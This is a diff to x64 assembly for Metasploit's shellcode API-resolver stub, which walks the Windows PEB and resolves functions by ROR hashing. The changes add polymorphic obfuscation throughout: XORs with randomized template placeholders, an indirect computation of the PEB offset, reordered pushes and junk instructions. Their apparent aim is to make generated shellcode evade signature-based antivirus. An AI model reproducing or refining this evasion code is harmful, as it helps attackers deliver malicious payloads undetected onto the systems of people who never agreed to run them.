@@ -9,18 +9,29 @@ _start:
 metasploit_block_api:
     push r9
     push r8
+    xor rax,rax
+    mov rax,0xff
     push rdx
-    push rcx
-    push rsi
     xor rdx,rdx
-    mov rdx,[gs:rdx+0x60]
+    xor rax,0x9f
+    mov rax,[gs:rax] ; 0x60
+    xor rax,%RANDOM_1%
+    push rcx
+    mov rdx,rax
+    xor rdx,%RANDOM_1%
+    ; mov rdx,[rax+0x60]
     mov rdx,[rdx+0x18]
+    xor rdx,rax
+    push rsi
+    xor rdx,rax
+    nop
     mov rdx,[rdx+0x20]
 
 load_module_name:
     mov rsi,[rdx+0x50]     
-    movzx rcx, word [rdx+0x4a]  
+    movzx rcx, word [rdx+0x4a]
     xor r9,r9  
+    shl rcx, 1
 
 module_hash_loop:
     xor rax,rax 
@@ -30,6 +41,7 @@ module_hash_loop:
     sub al,0x20
 skip_case_adjustment:
     ror r9d,%ROR_VALUE%
+    dec rcx
     add r9d,eax
     loop module_hash_loop
 
@@ -81,6 +93,7 @@ final:
     mov eax,[r8+rcx*4] 
     pop r8
     add rax,rdx 
+    xor rax,%RANDOM_2%
     pop r8
     pop rsi
     pop rcx 
@@ -90,6 +103,7 @@ final:
     pop r10
     sub rsp,byte 0x20
     push r10
+    xor rax,%RANDOM_2%
     jmp rax 
 
 pre_load_next_module:
